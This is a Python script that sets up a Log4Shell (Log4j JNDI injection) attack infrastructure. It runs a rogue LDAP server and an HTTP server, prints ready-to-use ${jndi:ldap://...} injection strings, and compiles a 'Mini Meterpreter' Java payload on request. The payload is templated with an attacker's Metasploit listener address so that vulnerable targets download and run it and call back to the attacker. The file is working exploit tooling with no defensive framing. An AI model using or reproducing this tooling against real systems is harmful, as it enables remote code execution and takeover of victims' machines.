#!/usr/bin/python3
import argparse
import subprocess
import sys
import os
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler


def check_if_installed(prog):
    try:
        result = subprocess.call([prog, '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except Exception:
        result = -1
    finally:
        if result != 0:
            print(f'{prog} is not installed...exiting')
            os._exit(1)

def ensure_dir_exists(dir_name):
    if os.path.isdir(dir_name):
        return
    try:
        os.mkdir(dir_name)
    except Exception:
        print(f'Error unable to create dir : {dir_name} .......exiting')
        os._exit(1)

def ensure_l4sutils_are_built(jar_file):
    if os.path.isfile(jar_file):
        return 
    print("building l4sutils.jar...this may take a few minutes")
    check_if_installed("mvn")
    #subprocess.call(["sh", "-c", "./build_l4sutils.sh"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    pom_file = os.path.join("l4sutils", "pom.xml") 
    print(f'the pom file is at {pom_file}')
    subprocess.call(["mvn", "-f", pom_file, "clean", "package", "assembly:single", "-Dmaven.test.skip=true"])#, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    
    print("just returned from calling mvn to build jar file")
    if not os.path.isfile(jar_file):
        # if here then the build failed
        print("executing build_l4sutils.sh failed.....exiting")
        os._exit(1)

def compile_mm_file(name):
    parts = name.split("_")
    if len(parts) <=3  :
        print(f'Error creating {name} expected format to be MM_oct1_oct2_oct3_oct4_port')
        print("For example for localhost port 1234 it would be MM_127_0_0_1_1234")
        return

    msf_ip = '.'.join(parts[1:-1])
    msf_port = parts[-1]
    print(f'{msf_ip} : {msf_port}')
    try:
        with open(f'exploits/MM.java', "r") as template:
            source = template.read().replace("<MSF_IP>", msf_ip).replace("<MSF_PORT>", msf_port).replace("<CLASS_NAME>", name)
    
        with open(f'build_tmp/{name}.java', "w+") as dest:
            dest.write(str(source))
       
        print(f'{name} java file created success')
        subprocess.run(["javac", "-d", "wwwroot", f'build_tmp/{name}.java'])
        print("Just compiled payload")
    except Exception as e:
        print(f'Something went wrong compiling java file {name} : {e.__str__()}')


def run_servers(http_ip, http_port, ldap_port):
    check_if_installed("java")
    check_if_installed("javac")
        
    ensure_dir_exists("build_tmp")
    ensure_dir_exists("wwwroot")

    print('Setting up the LDAP and web server.', end="\n\n")
    # create the LDAP server on new thread
    t1 = threading.Thread(target=create_ldap_server, args=(ldap_port, http_ip, http_port))
    t1.start()
    
    class Handler(SimpleHTTPRequestHandler):
        def translate_path(self, path):
            name = path[1:-6]
            if name.startswith("MM_"):
                #dynamically build new Mini Meterprter class
                compile_mm_file(name)
            # get the path from cwd
            path = super().translate_path(path)
            # get the relative path
            relpath = os.path.relpath(path, os.getcwd())
            # return the full path from root_dir
            return os.path.join("wwwroot", relpath)

        def list_directory(self, p):
            #do not allow dir listing
            self.send_error(404, "Not Found")

    # start the web server
    with HTTPServer(('0.0.0.0', int(http_port)), Handler) as httpd:
        print(f'started http server on port {http_port}')
        httpd.serve_forever()


def create_ldap_server(ldap_port, http_ip, http_port):
    jar_file =  "l4sutils/target/l4sutils-0.1-all.jar"
    ensure_l4sutils_are_built(jar_file)
    print("---------------------------")
    print('${jndi:ldap://%s:%s/#MM_:host:port}' % (http_ip, ldap_port))
    print("")
    print("For example to point to metaplsoit running on localhost port 1234 you would use : ")
    print('${jndi:ldap://%s:%s/#MM:127.0.0.1:1234}' % (http_ip, ldap_port))
    print("---------------------------")

    url = f"http://{http_ip}:{http_port}/"
    subprocess.run(["java", "-jar", jar_file, url, str(ldap_port)])

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(
                description='please enter the values ')
        
        parser.add_argument('http_ip', type=str,
                help='Enter IP for HTTP server.  This is expected to be an interface on this computer.')

        parser.add_argument('http_port', type=int,
                help='listener port for HTTP server')

        parser.add_argument('--ldap_port', type=int,
                help='listener port for LDAP server that will run on this computer', default=1389)

        args = parser.parse_args()
        print("about to start.....")
        run_servers(args.http_ip, args.http_port, args.ldap_port)
    except KeyboardInterrupt:
        print("[EXIT] User interrupted the program.")
        os._exit(0)
